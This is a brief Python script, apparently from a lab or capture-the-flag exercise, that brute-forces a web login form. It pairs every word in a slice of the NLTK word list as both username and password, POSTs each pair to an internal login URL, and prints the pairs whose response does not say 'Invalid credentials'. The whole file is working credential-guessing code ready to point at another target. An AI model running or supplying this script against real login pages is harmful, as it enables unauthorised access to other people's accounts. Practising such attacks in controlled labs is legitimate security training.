import requests
import nltk
nltk.download('words')
from nltk.corpus import words




#word range printed in start message and start/b3dict.txt
#replace with [YOUR_BEGIN_INDEX:YOUR_END_INDEX+1]
#python list slice list[begin:end)
creds = words.words()[81003:81024]

#url='http://YOUR_INTERNAL_IP/login'
url='http://10.138.0.60/login'

#iterate over dictionary list for user names
for u in creds:
        #iterate over dictionary list for passwords
	for p in creds:
		#prepare data for post request
		payload={'username':u,'password':p}
                #send username and password through post method to web app url
		post=requests.Session().post(url, data=payload)
                #check if respond text contains invalid credentails
		if 'Invalid credentials' not in  post.text:
			#print valid username and password
			print(u+' '+p )


